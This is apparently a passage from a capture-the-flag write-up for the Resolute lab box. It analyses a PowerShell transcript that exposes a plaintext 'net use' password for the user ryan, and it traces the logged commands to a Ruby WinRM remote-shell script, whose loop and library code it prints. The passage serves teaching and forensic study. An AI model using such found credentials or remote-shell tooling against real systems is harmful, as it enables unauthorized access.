PSRemotingProtocolVersion: 2.3
SerializationVersion: 1.1.0.1
**********************
**********************
Command start time: 20191203063515
**********************
PS>CommandInvocation(Out-String): "Out-String"
>> ParameterBinding(Out-String): name="InputObject"; value="The syntax of this command is:"
cmd : The syntax of this command is:
At line:1 char:1
+ cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (The syntax of this command is::String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
cmd : The syntax of this command is:
At line:1 char:1
+ cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (The syntax of this command is::String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
**********************
Windows PowerShell transcript start
Start time: 20191203063515
Username: MEGABANK\ryan
RunAs User: MEGABANK\ryan
Machine: RESOLUTE (Microsoft Windows NT 10.0.14393.0)
Host Application: C:\Windows\system32\wsmprovhost.exe -Embedding
Process ID: 2800
PSVersion: 5.1.14393.2273
PSEdition: Desktop
PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.14393.2273
BuildVersion: 10.0.14393.2273
CLRVersion: 4.0.30319.42000
WSManStackVersion: 3.0
PSRemotingProtocolVersion: 2.3
SerializationVersion: 1.1.0.1
**********************

```

This is noisy, but I’ll simplify the activity here. There are four commands. All of the commands were run on 3 December 2019 by MEGABANK\ryan.

| Time | Command | Comments |
| --- | --- | --- |
| 06:34:55 [+00:00] | `Invoke-Expression "-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'> '); if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"` | This looks to be creating a console prompt. More in a minute. |
| 06:34:55 [+00:00] | `Out-String "PS megabank\ryan@RESOLUTE Documents> "` | The results of the previous command, piped to `Out-String`. |
| 06:35:15 [+00:20] | `Invoke-Expression "cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!; if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"` | Now running `net use` to map a share. |
| 06:35:15 [+00:20] | `Out-String "The syntax of this command is:..."` | Printing an error that the command failed |

This isn’t that remarkable, except that I recognized this: `-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'> ')`. I remember it from [Hackback](/2019/07/06/htb-hackback.html#connect-over-winrm). This was before Evil-WinRM, when I used [Alamot’s ruby WinRM shell](https://github.com/Alamot/code-snippets/blob/master/winrm/winrm_shell.rb), which is based on the `winrm` library for Ruby. The shell was erroring out because `gi $pwd` was failing because it was hidden, and I patched it.

The loop in this shell is simple:

```

conn.shell(:powershell) do |shell|
    until command == "exit\n" do
        output = shell.run("-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'> ')")
        print(output.output.chomp)
        command = gets        
        output = shell.run(command) do |stdout, stderr|
            STDOUT.print stdout
            STDERR.print stderr
        end
    end    
    puts "Exiting with code #{output.exitcode}"
end

```

It first runs the commands to generate the prompt by passing the command to `shell.run`, and then prints the prompt, reads input, and passes the input to `shell.run`.

It turns out that if I dig into the source for the WinRM Ruby module, I can find where [it takes the command as a string to run it](https://github.com/WinRb/WinRM/blob/f3ed446bbaa038a66361f558c3a89a787e1a8169/lib/winrm/shells/power_shell.rb#L100):

```

def send_command(command, _arguments)
    command_id = SecureRandom.uuid.to_s.upcase
    command += "\r\nif (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
    message = PSRP::MessageFactory.create_pipeline_message(@runspace_id, command_id, command)
    fragmenter.fragment(message) do |fragment|
        command_args = [connection_opts, shell_id, command_id, fragment]
        if fragment.start_fragment
            resp_doc = transport.send_request(WinRM::WSMV::CreatePipeline.new(*command_args).build)
            command_id = REXML::XPath.first(resp_doc, "//*[local-name() = 'CommandId']").text
        else
            transport.send_request(WinRM::WSMV::SendData.new(*command_args).build)
        end
    end

    logger.debug("[WinRM] Command created for #{command} with id: #{command_id}")
    command_id
end

```

In the second line, it appends the status code check that I saw in the transcript!

It seems that the box’s creator connected to WinRM using Alamot’s script, and ran the one `net use` command, generating these four logs.

[Debugging CME, PSexec »](/2020/06/01/resolute-more-beyond-root.html)